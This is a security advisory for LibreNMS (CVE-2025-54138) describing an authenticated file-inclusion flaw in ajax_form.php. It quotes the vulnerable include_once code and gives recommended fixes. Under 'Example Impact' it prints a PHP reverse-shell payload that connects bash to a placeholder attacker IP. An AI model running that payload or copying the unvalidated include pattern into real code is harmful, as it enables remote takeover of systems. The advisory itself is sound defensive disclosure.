# [H] LibreNMS has Authenticated Remote File Inclusion in ajax_form.php that Allows RCE

## Summary
Severity: High
Advisory: GHSA-gq96-8w38-hhj2
CVE: CVE-2025-54138
CWE: CWE-98
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-07-21
Source: https://github.com/advisories/GHSA-gq96-8w38-hhj2
Type: github-advisory

## Affected
- Packagist: `librenms/librenms` — affected >=0 <25.7.0

## Details
LibreNMS 25.6.0 contains an architectural vulnerability in the `ajax_form.php` endpoint that permits Remote File Inclusion based on user-controlled POST input. 

The application directly uses the `type` parameter to dynamically include `.inc.php` files from the trusted path `includes/html/forms/`, without validation or allowlisting:

```php
if (file_exists('includes/html/forms/' . $_POST['type'] . '.inc.php')) {
    include_once 'includes/html/forms/' . $_POST['type'] . '.inc.php';
}
```
This pattern introduces a latent Remote Code Execution (RCE) vector if an attacker can stage a file in this include path — for example, via symlink, development misconfiguration, or chained vulnerabilities.

>  This is not an arbitrary file upload bug. But it does provide a powerful execution sink for attackers with write access (direct or indirect) to the include directory.

# Conditions for Exploitation

- Attacker must be authenticated    
- Attacker must control a file at `includes/html/forms/{type}.inc.php` (or symlink)        

# Example Impact (RCE)

If a PHP file or symlinked shell is staged in the include path, an attacker can achieve full remote code execution under the `librenms` user context:

```php
<?php system('/bin/bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"'); ?>
```
https://github.com/user-attachments/assets/deb9ccd2-101c-4172-89b1-b840b7ed3812


---

# Recommended Fix

- Implement strict allow listing or hardcoded routing instead of dynamically including user-supplied filenames. 
- Avoid passing raw POST input into `include_once`.
- Ensure the inclusion path is immutable and outside attacker control (e.g., avoid variable expansion into trusted paths).

## References
- https://github.com/librenms/librenms/security/advisories/GHSA-gq96-8w38-hhj2
- https://nvd.nist.gov/vuln/detail/CVE-2025-54138
- https://github.com/librenms/librenms/pull/17990
- https://github.com/librenms/librenms/commit/ec89714d929ef0cf2321957ed9198b0f18396c81
- https://github.com/librenms/librenms
- https://github.com/librenms/librenms/releases/tag/25.7.0
